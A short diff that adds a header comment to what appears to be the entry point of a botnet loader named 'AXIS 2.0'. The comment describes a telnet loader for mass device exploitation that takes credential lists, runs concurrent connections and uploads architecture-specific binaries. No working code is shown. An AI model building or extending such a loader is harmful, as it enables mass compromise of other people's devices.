@@ -1,5 +1,10 @@
 /*
  * AXIS 2.0 Botnet Loader - Main Entry Point
+ * ============================================================================
+ * Production-grade telnet loader for mass device exploitation
+ * Reads IP:port credentials from stdin, manages concurrent connections
+ * Automatically detects architecture and uploads appropriate binary
+ * ============================================================================
  */
 
 #include "includes.h"
